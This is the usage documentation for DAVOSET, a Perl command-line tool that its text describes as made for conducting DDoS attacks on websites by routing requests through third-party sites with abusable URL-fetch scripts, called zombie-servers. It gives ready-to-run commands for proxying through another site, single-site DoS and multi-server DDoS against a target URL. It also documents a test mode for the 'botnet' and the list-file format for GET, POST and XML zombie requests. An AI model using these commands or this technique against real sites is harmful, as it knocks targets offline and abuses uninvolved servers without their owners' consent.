# Program summary
#############################################

DAVOSET - it is console (command line) tool for conducting DDoS attacks on the sites via Abuse of Functionality vulnerabilities at other sites.

About such attacks you can read in my article "Using of the sites for attacks on other sites" (http://websecurity.com.ua/4322/).

#############################################
# Usage of the tool
#############################################

To use another site as a proxy (to access or attack one site by connecting via another site):

perl davoset.pl u=http://site l=one_server.txt

To conduct DoS attack via another site:

perl davoset.pl u=http://site/large_file l=one_server.txt

To conduct DDoS attack via a list of zombie-servers:

perl davoset.pl u=http://site l=many_servers.txt

#############################################
# Attacking on the site
#############################################

1. Start the program:

davoset.pl

2. Enter URL of the site to attack:

Site: http://site

3. Get the site attacked via your list of zombie-servers.

Or from command line:

perl davoset.pl u=http://site

perl davoset.pl u=http://site l=list.txt m=1 c=100

To explicitly set logging:

perl davoset.pl u=http://site l=list.txt log=1

#############################################
# Testing of the botnet
#############################################

1. Start the program:

davoset.pl

2. Set test mode:

Site: test

3. Get the results of testing of list of zombie-servers in the botnet.

Or from command line:

perl davoset.pl test

perl davoset.pl u=test

To explicitly set logging:

perl davoset.pl u=test log=1

#############################################
# Format of the file with list of zombie-servers
#############################################

The format of file with list of zombie-servers is the next:

http://site/script?url=
http://site/script?url=;GET
http://site/script;POST;file-with-POST.txt
http://site/script;XML;file-with-XML.txt

The first parameter is URL of the zombie, the second parameter is request method (in case of GET method it can be skipped) and the third parameter is file with POST parameters (in case of GET method it can be skipped).

In case of POST method the parameters are set in the file in CGI notation:

param=value&url=

The parameter (url in this case), in which URL of the site for attack is setting, must be at the end of address of zombie-server for GET request or in the end of the file with POST parameters for POST request.

In case of XML method the format of file with XML is present in the file XML.txt. Which can be used by default for such attacks.
